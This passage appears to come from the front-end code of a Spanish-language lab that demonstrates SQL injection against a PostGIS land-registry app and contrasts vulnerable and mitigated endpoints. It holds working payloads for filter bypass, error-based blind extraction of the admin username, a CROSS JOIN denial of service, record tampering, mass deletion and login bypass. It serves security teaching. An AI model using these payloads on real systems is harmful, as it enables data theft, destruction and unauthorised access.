+      ['cardBarrier1', 'cardBarrier2', 'cardBarrier3'].forEach(id => {
+        const el = document.getElementById(id);
+        el.className = 'barrier-card';
+      });
+      document.getElementById('statusBarrier1').textContent = 'STANDBY';
+      document.getElementById('statusBarrier1').className = 'badge bg-dark font-mono text-secondary';
+      document.getElementById('statusBarrier2').textContent = 'STANDBY';
+      document.getElementById('statusBarrier2').className = 'badge bg-dark font-mono text-secondary';
+      document.getElementById('statusBarrier3').textContent = 'STANDBY';
+      document.getElementById('statusBarrier3').className = 'badge bg-dark font-mono text-secondary';
+      
+      document.getElementById('arrow1').className = 'fa-solid fa-chevron-right barrier-arrow';
+      document.getElementById('arrow2').className = 'fa-solid fa-chevron-right barrier-arrow';
+      document.getElementById('lblActiveBarrier').textContent = 'Ninguna';
+    }
+
+    // Actualiza visualmente el estado del pipeline de las 3 barreras
+    function updatePipelineDisplay(b1State, b2State, b3State, activeName = 'Ninguna') {
+      const applyState = (cardId, statusId, state, label) => {
+        const card = document.getElementById(cardId);
+        const st = document.getElementById(statusId);
+        card.className = `barrier-card ${state}`;
+        st.textContent = label;
+        if (state === 'blocked') {
+          st.className = 'badge bg-danger font-mono text-white';
+        } else if (state === 'passed') {
+          st.className = 'badge bg-success font-mono text-white';
+        } else if (state === 'bypassed') {
+          st.className = 'badge bg-warning font-mono text-dark';
+        } else {
+          st.className = 'badge bg-dark font-mono text-secondary';
+        }
+      };
+
+      applyState('cardBarrier1', 'statusBarrier1', b1State.state, b1State.label);
+      applyState('cardBarrier2', 'statusBarrier2', b2State.state, b2State.label);
+      applyState('cardBarrier3', 'statusBarrier3', b3State.state, b3State.label);
+
+      document.getElementById('arrow1').className = `fa-solid fa-chevron-right barrier-arrow ${b1State.state !== 'standby' ? 'active' : ''}`;
+      document.getElementById('arrow2').className = `fa-solid fa-chevron-right barrier-arrow ${b2State.state !== 'standby' ? 'active' : ''}`;
+      document.getElementById('lblActiveBarrier').textContent = activeName;
+    }
+
+    // ==========================================
+    // CARGA DE DATOS CATASTRALES Y RENDERIZADO
+    // ==========================================
+    async function loadStats() {
+      try {
+        document.getElementById('lblMapStatus').textContent = 'Cargando...';
+        const res = await fetch(`${API_BASE}/admin/stats`);
+        const data = await res.json();
+        
+        document.getElementById('lblTotalLotes').textContent = `${data.total_lotes} predios`;
+        document.getElementById('lblTotalTitulares').textContent = `${data.total_titulares}`;
+        document.getElementById('dotDb').className = 'pulse-dot online';
+
+        // Renderizar tabla titulares
+        const tbody = document.getElementById('tblTitulares');
+        tbody.innerHTML = '';
+        if (data.muestra_titulares && data.muestra_titulares.length > 0) {
+          data.muestra_titulares.forEach(t => {
+            const tr = document.createElement('tr');
+            const isHacked = t.titular && t.titular.includes('HACKER');
+            const isZero = t.autovaluo === 0;
+            tr.innerHTML = `
+              <td><code>${t.id_lote}</code></td>
+              <td class="text-secondary">${t.dni}</td>
+              <td class="${isHacked ? 'text-danger fw-bold' : 'text-light'}">${t.titular}</td>
+              <td class="${isZero ? 'text-danger fw-bold' : 'text-success'}">S/ ${Number(t.autovaluo).toFixed(2)}</td>
+            `;
+            tbody.appendChild(tr);
+          });
+        }
+
+        // Renderizar polígonos GeoJSON
+        if (data.geojson && data.geojson.features && data.geojson.features.length > 0) {
+          baseGeojsonData = data.geojson;
+          renderGeojsonOnMap(data.geojson, '#38bdf8', true);
+        }
+        document.getElementById('lblMapStatus').textContent = 'Activo';
+      } catch (err) {
+        console.error("Error cargando estadísticas del catastro:", err);
+        document.getElementById('lblMapStatus').textContent = 'Error Conexión';
+        document.getElementById('dotDb').className = 'pulse-dot danger';
+      }
+    }
+
+    function renderGeojsonOnMap(geojsonData, color = '#38bdf8', fit = true) {
+      if (geojsonLayer) {
+        map.removeLayer(geojsonLayer);
+      }
+      if (!geojsonData || !geojsonData.features || geojsonData.features.length === 0) return;
+
+      geojsonLayer = L.geoJSON(geojsonData, {
+        style: function(feature) {
+          const isCompromised = color === '#f43f5e';
+          return {
+            color: color,
+            weight: isCompromised ? 2.5 : 1.5,
+            fillColor: color,
+            fillOpacity: isCompromised ? 0.65 : 0.25
+          };
+        },
+        onEachFeature: function(feature, layer) {
+          const p = feature.properties || {};
+          const popupContent = `
+            <div style="font-family: var(--font-code); font-size: 12px; min-width: 180px; color: #0f172a; padding: 4px;">
+              <div style="font-weight: 700; color: #0284c7; border-bottom: 1px solid #cbd5e1; padding-bottom: 3px; margin-bottom: 5px;">
+                🏛️ LOTE: ${p.id_lote || 'N/A'}
+              </div>
+              <div><strong>Sector:</strong> ${p.sector || p.cod_sector || 'N/A'}</div>
+              <div><strong>Zonificación:</strong> ${p.tipo_suelo || 'Urbano'}</div>
+              <div><strong>Titular:</strong> ${p.titular || 'N/A'}</div>
+              <div><strong>Autovalúo:</strong> S/ ${(p.autovaluo !== undefined ? Number(p.autovaluo).toLocaleString('es-PE', {minimumFractionDigits: 2}) : '0.00')}</div>
+            </div>
+          `;
+          layer.bindPopup(popupContent);
+        }
+      }).addTo(map);
+
+      if (fit) {
+        fitCatastroBounds();
+      }
+    }
+
+    function fitCatastroBounds() {
+      if (geojsonLayer) {
+        try {
+          const bounds = geojsonLayer.getBounds();
+          if (bounds.isValid()) {
+            map.fitBounds(bounds, { padding: [25, 25] });
+          }
+        } catch (e) {
+          console.warn("No se pudieron calcular límites del GeoJSON:", e);
+        }
+      }
+    }
+
+    // Resaltado de predios afectados
+    function highlightParcels(predios, color = '#f43f5e') {
+      const features = [];
+      predios.forEach(p => {
+        if (p.geojson) {
+          try {
+            const g = typeof p.geojson === 'string' ? JSON.parse(p.geojson) : p.geojson;
+            features.push({
+              type: "Feature",
+              properties: {
+                id_lote: p.id_lote,
+                sector: p.cod_sector,
+                tipo_suelo: p.tipo_suelo,
+                titular: p.titular || 'N/A',
+                autovaluo: p.autovaluo || 0.0
+              },
+              geometry: g
+            });
+          } catch (e) {
+            console.error("Error parseando geojson:", e);
+          }
+        }
+      });
+      if (features.length > 0) {
+        renderGeojsonOnMap({ type: "FeatureCollection", features: features }, color, true);
+      }
+    }
+
+    // ==========================================
+    // BUSCADOR CATASTRAL INTERACTIVO
+    // ==========================================
+    function setSearchPayload(val) {
+      document.getElementById('inputCriterio').value = val;
+      ejecutarBusquedaLotes();
+    }
+
+    function limpiarBusqueda() {
+      document.getElementById('inputCriterio').value = '';
+      document.getElementById('divResultadosBusqueda').className = 'd-none';
+      document.getElementById('lblResultadosBusqueda').textContent = '0 resultados';
+      document.getElementById('lblResultadosBusqueda').className = 'badge bg-secondary font-mono';
+      resetPipelineUI();
+      loadStats();
+    }
+
+    async function ejecutarBusquedaLotes() {
+      const criterio = document.getElementById('inputCriterio').value.trim();
+      if (!criterio) {
+        alert("Ingresa un ID, titular o payload de inyección para buscar.");
+        return;
+      }
+
+      setLoadingState(`Buscando predios con "${criterio}" en modo ${activeMode.toUpperCase()}...`);
+      const start = performance.now();
+      const url = `${API_BASE}/${activeMode}/predios/buscar?criterio=${encodeURIComponent(criterio)}`;
+
+      try {
+        const res = await fetch(url);
+        const duration = (performance.now() - start).toFixed(2);
+        const json = await res.json();
+
+        if (res.status === 200 && json.status === "success") {
+          searchResultItems = json.predios || [];
+          const count = json.total || 0;
+          
+          const badge = document.getElementById('lblResultadosBusqueda');
+          badge.textContent = `${count} encontrados`;
+          badge.className = count > 1 ? 'badge bg-danger font-mono' : (count === 1 ? 'badge bg-success font-mono' : 'badge bg-secondary font-mono');
+
+          const divResultados = document.getElementById('divResultadosBusqueda');
+          const tbody = document.getElementById('tblResultadosBusqueda');
+          tbody.innerHTML = '';
+
+          if (count > 0) {
+            divResultados.className = 'd-block mt-2';
+            searchResultItems.forEach((p, idx) => {
+              const tr = document.createElement('tr');
+              const isExfil = (p.id_lote && p.id_lote.includes('admin')) || (p.tipo_suelo === 'EXFILTRADO');
+              tr.innerHTML = `
+                <td><code>${p.id_lote}</code></td>
+                <td><span class="badge bg-secondary">${p.cod_sector || '-'}</span></td>
+                <td class="${isExfil ? 'text-danger fw-bold' : 'text-light'}">${p.titular}</td>
+                <td>S/ ${Number(p.autovaluo).toFixed(2)}</td>
+                <td><button class="btn btn-xs btn-outline-info font-mono py-0 px-2" onclick="focusParcel(${idx})">🎯 Ver</button></td>
+              `;
+              tbody.appendChild(tr);
+            });
+
+            highlightParcels(searchResultItems, activeMode === 'vulnerable' && count > 1 ? '#f43f5e' : '#10b981');
+          } else {
+            divResultados.className = 'd-block mt-2';
+            tbody.innerHTML = '<tr><td colspan="5" class="text-center text-muted py-2">No se encontraron lotes para este criterio.</td></tr>';
+          }
+
+          if (activeMode === 'vulnerable') {
+            if (count > 1) {
+              updatePipelineDisplay(
+                { state: 'bypassed', label: 'BYPASS' },
+                { state: 'bypassed', label: 'N/A' },
+                { state: 'bypassed', label: 'SQLI INYECTADO' },
+                'Ninguna (Vulnerable)'
+              );
+              setInspectorData(
+                `🚨 SQLi EXITOSA: ${count} REGISTROS EXPUESTOS`,
+                json.query_debug,
+                duration,
+                res.status,
+                '⚠️ VULNERABLE // EXFILTRACIÓN',
+                `El parámetro 'criterio' fue interpolado directamente con comillas simples en el LIKE. Se quebró la sintaxis SQL y se neutralizó el aislamiento de registros.`
+              );
+            } else {
+              updatePipelineDisplay(
+                { state: 'bypassed', label: 'BYPASS' },
+                { state: 'bypassed', label: 'N/A' },
+                { state: 'passed', label: 'EJECUTADO' },
+                'Ninguna (SQL Dinámico)'
+              );
+              setInspectorData(
+                `ℹ️ BÚSQUEDA VULNERABLE (1 LOTE)`,
+                json.query_debug,
+                duration,
+                res.status,
+                '⚠️ SQL DINÁMICO (EXPUESTO)',
+                `Se encontró 1 lote legítimo. Sin embargo, la sentencia fue ensamblada por f-string sin prepared statements. Cualquier comilla simple romperá la estructura.`
+              );
+            }
+          } else {
+            // Mitigado: GeoAlchemy2 / SQLAlchemy con Bind Variable
+            updatePipelineDisplay(
+              { state: 'passed', label: 'VALIDADO' },
+              { state: 'passed', label: 'N/A' },
+              { state: 'passed', label: 'BIND VARIABLE' },
+              'Barrera 3: GeoAlchemy2 / SQLAlchemy Bind'
+            );
+            setInspectorData(
+              `🛡️ INYECCIÓN NEUTRALIZADA CON PREPARED STATEMENT`,
+              json.query_debug,
+              duration,
+              res.status,
+              '🛡️ PROTEGIDO (BIND VARIABLE)',
+              `SQLAlchemy compiló el criterio dentro del parámetro seguro <code>:clean_param</code>. Los caracteres maliciosos (' OR '1'='1) fueron tratados estrictamente como texto literal buscado.`
+            );
+          }
+        } else {
+          // Bloqueo por Pydantic (HTTP 422)
+          updatePipelineDisplay(
+            { state: 'blocked', label: 'BLOQUEADO' },
+            { state: 'standby', label: 'STANDBY' },
+            { state: 'standby', label: 'STANDBY' },
+            'Barrera 1: Pydantic Validation'
+          );
+          setInspectorData(
+            `🛡️ PAYLOAD RECHAZADO POR BARRERA 1 (HTTP ${res.status})`,
+            `Validación Pydantic en borde de API: max_length=50 excedido o formato inválido.`,
+            duration,
+            res.status,
+            '🛡️ BLOQUEO PREVENTIVO EN CAPA 1',
+            `El validador de tipos de Pydantic interceptó el payload malicioso antes de que el motor SQL o PostGIS fueran alcanzados.`
+          );
+        }
+      } catch (err) {
+        showError(err);
+      }
+    }
+
+    function focusParcel(idx) {
+      if (searchResultItems[idx] && searchResultItems[idx].geojson) {
+        try {
+          const g = typeof searchResultItems[idx].geojson === 'string' ? JSON.parse(searchResultItems[idx].geojson) : searchResultItems[idx].geojson;
+          const tempLayer = L.geoJSON(g);
+          map.fitBounds(tempLayer.getBounds(), { maxZoom: 18, padding: [30, 30] });
+        } catch(e) {
+          console.warn("Error enfocando lote:", e);
+        }
+      }
+    }
+
+    // =====================================================================
+    // LAS 6 AMENAZAS DEL PAPER DOCTORAL (IMPLEMENTACIÓN DIDÁCTICA)
+    // =====================================================================
+
+    // 1. SPATIAL LOGIC BYPASS
+    async function runAttack1_Bypass() {
+      highlightActiveAttackBtn('btnAtk1');
+      setLoadingState("Ejecutando Amenaza 1: Spatial Logic Bypass...");
+      const start = performance.now();
+      
+      const payload = "50) OR (1=1";
+      const url = `${API_BASE}/${activeMode}/predios/radio?x=390550&y=8248097&distancia=${encodeURIComponent(payload)}&sector=0101`;
+      
+      try {
+        const res = await fetch(url);
+        const duration = (performance.now() - start).toFixed(2);
+        const json = await res.json();
+
+        if (activeMode === 'vulnerable') {
+          updatePipelineDisplay(
+            { state: 'bypassed', label: 'BYPASS' },
+            { state: 'bypassed', label: 'N/A' },
+            { state: 'bypassed', label: 'ST_DWithin QUEBRADO' },
+            'Ninguna (Bypass Total)'
+          );
+          setInspectorData(
+            `🚨 AMENAZA 1 EXITOSA: EXFILTRACIÓN DE LÍMITE TERRITORIAL`,
+            json.query_debug || "SELECT ... WHERE cod_sector = '0101' AND ST_DWithin(..., 50) OR (1=1)",
+            duration,
+            res.status,
+            '🚨 EXFILTRACIÓN MASIVA',
+            `El atacante cerró prematuramente el paréntesis de <code>ST_DWithin</code> e inyectó una tautología <code>OR (1=1)</code>. La base de datos ejecutó un barrido secuencial anulando la restricción de sector territorial. Se exfiltraron ${json.total} parcelas.`
+          );
+          if (json.predios && json.predios.length > 0) {
+            highlightParcels(json.predios, '#f43f5e');
+          }
+        } else {
+          updatePipelineDisplay(
+            { state: 'blocked', label: 'RECHAZADO (422)' },
+            { state: 'standby', label: 'STANDBY' },
+            { state: 'standby', label: 'PROTEGIDO' },
+            'Barrera 1: Pydantic Float Bounding'
+          );
+          setInspectorData(
+            `🛡️ AMENAZA 1 NEUTRALIZADA POR BARRERA 1`,
+            `SELECT tg_lote ... WHERE and_(TgLote.cod_sector == :sector, ST_DWithin(geom, :punto, :distancia))\n[Validación: distancia debe ser float acotado (gt=0, le=5000)]`,
+            duration,
+            res.status,
+            '🛡️ PROTEGIDO EN CAPA API',
+            `Pydantic verificó estrictamente que 'distancia' sea un número de punto flotante acotado entre 0 y 5,000 metros. La presencia de paréntesis u operadores SQL detuvo la petición con HTTP ${res.status} antes de ejecutar cualquier consulta.`
+          );
+        }
+      } catch (e) {
+        showError(e);
+      }
+    }
+
+    // 2. ERROR-BASED SPATIAL SQLI
+    async function runAttack2_ErrorBased() {
+      highlightActiveAttackBtn('btnAtk2');
+      setLoadingState("Ejecutando Amenaza 2: Inferencia de Error Espacial en GEOS...");
+      const start = performance.now();
+      
+      // Payload que provoca fallo condicional de motor geométrico
+      const payloadWkt = "POLYGON((0 0, 0 1, 1 1, 1 0, 0 0))', 32719)) AND (1 = (1 / (CASE WHEN (SELECT SUBSTRING(username, 1, 1) FROM catastro_usuarios WHERE username='admin') = 'a' THEN 0 ELSE 1 END))) AND ST_Intersects(objcad_lote_gemo, ST_GeomFromText('POLYGON((0 0, 0 1, 1 1, 1 0, 0 0))";
+      const url = `${API_BASE}/${activeMode}/predios/poligono?wkt_polygon=${encodeURIComponent(payloadWkt)}`;
+
+      try {
+        const res = await fetch(url);
+        const duration = (performance.now() - start).toFixed(2);
+        const json = await res.json();
+
+        if (activeMode === 'vulnerable') {
+          updatePipelineDisplay(
+            { state: 'bypassed', label: 'BYPASS' },
+            { state: 'bypassed', label: 'BYPASS' },
+            { state: 'blocked', label: 'ERROR POSTGIS (500)' },
+            'Excepción Reflejada en PostGIS'
+          );
+          setInspectorData(
+            `🚨 AMENAZA 2 EXITOSA: CANAL LATERAL DE ERROR DETONADO (HTTP 500)`,
+            json.detail ? (json.detail.query_debug || json.detail.database_error) : `SELECT ... ST_Intersects(..., ST_GeomFromText('${payloadWkt.substring(0, 60)}...'))`,
+            duration,
+            res.status,
+            '🚨 ERROR-BASED SQLi CONFIRMADO',
+            `PostGIS evaluó la rama condicional de la conjetura del usuario ('a'). Al ser verdadera, forzó una división por cero / error en el motor y devolvió HTTP 500. El atacante deduce el carácter sin ver textos en pantalla.`
+          );
+        } else {
+          updatePipelineDisplay(
+            { state: 'passed', label: 'SANITIZADO' },
+            { state: 'blocked', label: 'WKT INVÁLIDO (422)' },
+            { state: 'standby', label: 'POSTGIS A SALVO' },
+            'Barrera 2: Shapely Topology Validation'
+          );
+          setInspectorData(
+            `🛡️ AMENAZA 2 NEUTRALIZADA POR BARRERA 2 (SHAPELY)`,
+            `shapely.wkt.loads(payload.wkt_polygon)\n[Verificación en memoria: isinstance(geom, Polygon) and geom.is_valid]`,
+            duration,
+            res.status,
+            '🛡️ BLOQUEO TOPOLÓGICO EN MEMORIA',
+            `La Barrera 2 (Shapely) analizó la topología del WKT en la memoria de Python ANTES de tocar PostgreSQL. Al detectar sintaxis corrupta o sentencias anexas, abortó con HTTP ${res.status}. PostGIS nunca recibió la consulta ni expuso su canal de error.`
+          );
+        }
+      } catch (e) {
+        showError(e);
+      }
+    }
+
+    // Mini-Simulación de extracción ciega paso a paso (Amenaza 2)
+    async function startLiveErrorBlindExfiltration() {
+      highlightActiveAttackBtn('btnAtk2');
+      setInspectorData(
+        "⚡ SIMULANDO EXTRACCIÓN CIEGA BIT A BIT...",
+        "-- Iniciando canal lateral sobre /predios/poligono --",
+        0,
+        200,
+        "EXTRAYENDO CREDENCIAL...",
+        "Probando conjeturas sobre el primer carácter del usuario administrativo..."
+      );
+
+      const testChars = ['z', 'x', 'a']; // 'a' acertará en el usuario 'admin'
+      let logTrace = "-- Exfiltración ciega por canal lateral de error (GEOS) --\n";
+
+      for (let char of testChars) {
+        const p = `POLYGON((0 0, 0 1, 1 1, 1 0, 0 0))', 32719)) AND (1 = (1 / (CASE WHEN (SELECT SUBSTRING(username, 1, 1) FROM catastro_usuarios WHERE username='admin') = '${char}' THEN 0 ELSE 1 END))) AND ST_Intersects(objcad_lote_gemo, ST_GeomFromText('POLYGON((0 0, 0 1, 1 1, 1 0, 0 0))`;
+        const url = `${API_BASE}/${activeMode}/predios/poligono?wkt_polygon=${encodeURIComponent(p)}`;
+        
+        try {
+          const res = await fetch(url);
+          if (activeMode === 'vulnerable') {
+            if (res.status === 500) {
+              logTrace += `[!] Conjetura '${char}': HTTP 500 (¡ACIERTO! División por cero en PostGIS)\n`;
+              logTrace += `[***] Carácter 1 identificado con éxito: '${char}' -> 'admin'\n`;
+              setInspectorData(
+                `🎯 EXFILTRACIÓN EN VIVO: CARÁCTER '${char}' IDENTIFICADO`,
+                logTrace,
+                "42.1",
+                500,
+                '🚨 EXFILTRACIÓN CIEGA ACTIVA',
+                `En modo vulnerable, el atacante descubrió que el nombre de usuario empieza con '${char}' gracias al error HTTP 500 emitido por PostGIS.`
+              );
+              break;
+            } else {
+              logTrace += `[-] Conjetura '${char}': HTTP 200 (Falso, conjetura incorrecta)\n`;
+              document.getElementById('boxQuery').textContent = logTrace;
+            }
+          } else {
+            logTrace += `[🛡️] Conjetura '${char}': HTTP ${res.status} (Bloqueado por Shapely: WKT Inválido)\n`;
+            setInspectorData(
+              `🛡️ EXTRACCIÓN CIEGA FRUSTRADA POR BARRERA 2`,
+              logTrace,
+              "12.4",
+              res.status,
+              '🛡️ CANAL LATERAL ERRADICADO',
+              `En modo mitigado, Shapely interceptó la conjetura antes de que PostGIS pudiera responder, eliminando por completo el canal lateral de error.`
+            );
+            break;
+          }
+        } catch (e) {
+          console.error(e);
+        }
+      }
+    }
+
+    // 3. SPATIAL DOS
+    async function runAttack3_SpatialDoS() {
+      highlightActiveAttackBtn('btnAtk3');
+      setLoadingState("Lanzando Amenaza 3: Spatial DoS (Complejidad O(N²))...");
+      const start = performance.now();
+      
+      const payloadDos = "10 + (SELECT COUNT(*) FROM tg_lote a CROSS JOIN tg_lote b WHERE ST_Intersects(ST_Buffer(a.objcad_lote_gemo, 100, 100), ST_Buffer(b.objcad_lote_gemo, 100, 100)) AND a.id_lote <= '21010101000040' AND b.id_lote <= '21010101000040')";
+      const url = `${API_BASE}/${activeMode}/predios/analisis-expansion?buffer_metros=${encodeURIComponent(payloadDos)}&cod_sector=0101`;
+      
+      try {
+        const res = await fetch(url);
+        const duration = (performance.now() - start).toFixed(2);
+        const json = await res.json();
+
+        if (activeMode === 'vulnerable') {
+          updatePipelineDisplay(
+            { state: 'bypassed', label: 'BYPASS' },
+            { state: 'bypassed', label: 'N/A' },
+            { state: 'bypassed', label: 'CROSS JOIN O(N²)' },
+            'Ninguna (Sobrecarga de CPU)'
+          );
+          setInspectorData(
+            `🚨 AMENAZA 3 EXITOSA: LATENCIA DISPARADA A ${duration} ms`,
+            json.query_debug || `SELECT id_lote, ST_Area(ST_Buffer(geom, ${payloadDos.substring(0, 70)}...)) ...`,
+            duration,
+            res.status,
+            '🚨 SPATIAL DoS DETONADO',
+            `El atacante forzó a la librería GEOS a calcular un producto cruzado espacial de buffers con 100 segmentos. La CPU de PostgreSQL se saturó y la latencia subió a más de 15x respecto al promedio normal.`
+          );
+        } else {
+          updatePipelineDisplay(
+            { state: 'blocked', label: 'ACOTADO (422)' },
+            { state: 'standby', label: 'STANDBY' },
+            { state: 'standby', label: 'PROTEGIDO' },
+            'Barrera 1: Pydantic Range Bounding'
+          );
+          setInspectorData(
+            `🛡️ AMENAZA 3 NEUTRALIZADA POR BARRERA 1`,
+            `SELECT ... ST_Buffer(geom, :buffer_metros) WHERE cod_sector = :sector LIMIT 50\n[Validación Pydantic: buffer_metros float acotado a gt=0, le=100.0]`,
+            duration,
+            res.status,
+            '🛡️ RECURSOS DE CPU PRESERVADOS',
+            `Pydantic validó que 'buffer_metros' sea estrictamente numérico y menor a 100 metros. La inyección de subconsultas cruzadas y modificadores como 'quad_segs' fue rechazada al instante con HTTP ${res.status}.`
+          );
+        }
+      } catch (e) {
+        showError(e);
+      }
+    }
+
+    // 4. TAMPERING DE FICHA CATASTRAL
+    async function runAttack4_Tampering() {
+      highlightActiveAttackBtn('btnAtk4');
+      setLoadingState("Ejecutando Amenaza 4: Fraude en Ficha Catastral...");
+      const start = performance.now();
+      
+      const url = `${API_BASE}/${activeMode}/ficha/modificar?id_lote=21010101000000&nuevo_autovaluo=0&nuevo_titular=${encodeURIComponent('HACKER_TERRENOS_ILEGAL')}`;
+      
+      try {
+        const res = await fetch(url, { method: 'POST' });
+        const duration = (performance.now() - start).toFixed(2);
+        const json = await res.json();
+
+        if (activeMode === 'vulnerable') {
+          updatePipelineDisplay(
+            { state: 'bypassed', label: 'BYPASS' },
+            { state: 'bypassed', label: 'N/A' },
+            { state: 'bypassed', label: 'UPDATE EJECUTADO' },
+            'Ninguna (Corrupción Fiscal)'
+          );
+          setInspectorData(
+            `🚨 AMENAZA 4 EXITOSA: AUTOVALÚO ADULTERADO A S/ 0.00`,
+            json.query_debug || "UPDATE catastro_titulares SET autovaluo_soles = 0, nombre_completo = 'HACKER_TERRENOS_ILEGAL' WHERE id_lote = '21010101000000';",
+            duration,
+            res.status,
+            '🚨 INTEGRIDAD FISCAL VULNERADA',
+            `La sentencia SQL fue ejecutada sin validación de integridad ni permisos. El predio 21010101000000 fue adjudicado al atacante y su deuda de autovalúo fue reducida ilícitamente a cero.`
+          );
+          await loadStats();
+        } else {
+          updatePipelineDisplay(
+            { state: 'blocked', label: 'REGEX / GT=0 (422)' },
+            { state: 'standby', label: 'STANDBY' },
+            { state: 'standby', label: 'ORM PREVENTIVO' },
+            'Barrera 1: Pydantic Regex & Range'
+          );
+          setInspectorData(
+            `🛡️ AMENAZA 4 NEUTRALIZADA POR BARRERAS 1 Y 3`,
+            `UPDATE catastro_titulares SET autovaluo_soles = :autovaluo, nombre_completo = :titular WHERE id_lote = :id_lote\n[Validación: autovaluo gt=0, titular regex alfabético]`,
+            duration,
+            res.status,
+            '🛡️ INTEGRIDAD FISCAL SALVAGUARDADA',
+            `Pydantic rechazó el autovalúo en 0 (exige gt=0) y verificó mediante regex que el titular solo contenga nombres reales. Además, SQLAlchemy compila la consulta con bind variables impidiendo cualquier inyección lateral.`
+          );
+        }
+      } catch (e) {
+        showError(e);
+      }
+    }
+
+    // 5. DATA DESTRUCTION (BORRADO MASIVO)
+    async function runAttack5_DataDestruction() {
+      highlightActiveAttackBtn('btnAtk5');
+      setLoadingState("Ejecutando Amenaza 5: Borrado Destructivo de Lotes...");
+      const start = performance.now();
+      
+      const payloadSector = "0101' OR '1'='1";
+      const url = `${API_BASE}/${activeMode}/predios/borrar?filtro_sector=${encodeURIComponent(payloadSector)}`;
+      
+      try {
+        const res = await fetch(url, { method: 'DELETE' });
+        const duration = (performance.now() - start).toFixed(2);
+        const json = await res.json();
+
+        if (activeMode === 'vulnerable') {
+          updatePipelineDisplay(
+            { state: 'bypassed', label: 'BYPASS' },
+            { state: 'bypassed', label: 'N/A' },
+            { state: 'bypassed', label: 'DELETE TOTAL' },
+            'Ninguna (Destrucción Total)'
+          );
+          setInspectorData(
+            `🚨 AMENAZA 5 EXITOSA: APAGÓN CARTOGRÁFICO TOTAL`,
+            json.query_debug || "DELETE FROM tg_lote WHERE cod_sector = '0101' OR '1'='1';",
+            duration,
+            res.status,
+            '🚨 CATÁSTROFE DE DATOS',
+            `La inyección tautológica convirtió el borrado zonal en una purga masiva incondicional. Lotes restantes en la base de datos municipal: ${json.lotes_restantes}. El visor cartográfico quedó completamente desierto.`
+          );
+          await loadStats();
+        } else {
+          updatePipelineDisplay(
+            { state: 'blocked', label: 'REGEX ^\\d{4}$ (422)' },
+            { state: 'standby', label: 'STANDBY' },
+            { state: 'standby', label: 'DELETE CONTROLADO' },
+            'Barrera 1: Pydantic Regex Validation'
+          );
+          setInspectorData(
+            `🛡️ AMENAZA 5 NEUTRALIZADA POR BARRERAS 1 Y 3`,
+            `DELETE FROM tg_lote WHERE tg_lote.cod_sector = :filtro_sector\n[Validación Pydantic: regex=r"^\\d{4}$"]`,
+            duration,
+            res.status,
+            '🛡️ CARTOGRAFÍA PROTEGIDA',
+            `La Barrera 1 validó que el filtro de sector esté compuesto exclusivamente por 4 dígitos numéricos (^\\d{4}$). La presencia de comillas u operadores lógicos fue rechazada con HTTP ${res.status}.`
+          );
+        }
+      } catch (e) {
+        showError(e);
+      }
+    }
+
+    // 6. AUTH BYPASS
+    async function runAttack6_AuthBypass() {
+      highlightActiveAttackBtn('btnAtk6');
+      setLoadingState("Ejecutando Amenaza 6: Evasión de Autenticación en Visor...");
+      const start = performance.now();
+      
+      const url = `${API_BASE}/${activeMode}/auth/login?username=${encodeURIComponent("admin' --")}&password=arbitraria`;
+      
+      try {
+        const res = await fetch(url, { method: 'POST' });
+        const duration = (performance.now() - start).toFixed(2);
+        const json = await res.json();
+
+        if (res.status === 200 && activeMode === 'vulnerable') {
+          updatePipelineDisplay(
+            { state: 'bypassed', label: 'BYPASS' },
+            { state: 'bypassed', label: 'N/A' },
+            { state: 'bypassed', label: 'PASSWORD COMENTADA' },
+            'Ninguna (Acceso Ilegítimo)'
+          );
+          setInspectorData(
+            `🚨 AMENAZA 6 EXITOSA: SESIÓN SUPERADMIN CONCEDIDA`,
+            json.query_debug || "SELECT ... WHERE username = 'admin' --' AND password_hash = 'arbitraria';",
+            duration,
+            res.status,
+            '🚨 ESCALACIÓN DE PRIVILEGIOS',
+            `La secuencia de comentario SQL '--' anuló la verificación de la contraseña en la sentencia WHERE. El atacante obtuvo token con rol '${json.usuario.role}' sin conocer las credenciales reales.`
+          );
+        } else {
+          updatePipelineDisplay(
+            { state: 'blocked', label: 'REGEX / PARAM (401/422)' },
+            { state: 'standby', label: 'STANDBY' },
+            { state: 'passed', label: 'SHA-256 SEGURO' },
+            'Barrera 1 & 3: Prepared Statement + Hashing'
+          );
+          setInspectorData(
+            `🛡️ AMENAZA 6 NEUTRALIZADA POR BARRERAS 1 Y 3`,
+            `SELECT ... WHERE username = :username AND password_hash = :hash\n[Validación Pydantic: regex=r"^[a-zA-Z0-9_]+$" + SHA-256 Hashing]`,
+            duration,
+            res.status,
+            '🛡️ CONTROL DE ACCESO ROBUSTO',
+            `La Barrera 1 prohibió comillas o caracteres especiales en el nombre de usuario, y la Barrera 3 comparó el hash criptográfico SHA-256 mediante un parámetro bind seguro en la base de datos.`
+          );
+        }
+      } catch (e) {
+        showError(e);
+      }
+    }
+
+    // ==========================================
+    // RESTAURACIÓN DEL LABORATORIO CATASTRAL
+    // ==========================================
+    async function resetDatabase() {
+      setLoadingState("Restaurando muestra original de 1,500 lotes...");
+      try {
+        const res = await fetch(`${API_BASE}/admin/reset-catastro`, { method: 'POST' });
+        const json = await res.json();
+        await loadStats();
+        resetPipelineUI();
+        setInspectorData(
+          "✅ CATASTRO RESTAURADO A ESTADO INICIAL",
+          "-- TRUNCATE TABLE tg_lote, catastro_titulares; INSERT ... (1,500 parcelas LADM repobladas) --",
+          "N/A",
+          200,
+          "✅ BASE DE DATOS LIMPIA",
+          json.message || "Las tablas tg_lote y catastro_titulares han sido re-inicializadas con la cartografía oficial de Puno."
+        );
+      } catch (e) {
+        showError(e);
+      }
+    }
+
+    // ==========================================
+    // HELPERS UI E INSPECTOR
+    // ==========================================
+    function highlightActiveAttackBtn(btnId) {
+      document.querySelectorAll('.attack-btn').forEach(b => b.classList.remove('active-target'));
+      const active = document.getElementById(btnId);
+      if (active) active.classList.add('active-target');
+    }
+
+    function setLoadingState(msg) {
+      document.getElementById('badgeVerdict').className = 'badge bg-warning text-dark font-mono';
+      document.getElementById('badgeVerdict').textContent = '⏳ PROCESANDO...';
+      document.getElementById('boxQuery').textContent = `-- ${msg} --`;
+    }
+
+    function setInspectorData(headerTitle, queryText, latency, httpCode, verdictTitle, explanation) {
+      const badge = document.getElementById('badgeVerdict');
+      if (verdictTitle.includes('VULNERABLE') || verdictTitle.includes('EXFILTRACIÓN') || verdictTitle.includes('CATÁSTROFE') || verdictTitle.includes('ESCALACIÓN')) {
+        badge.className = 'badge bg-danger font-mono';
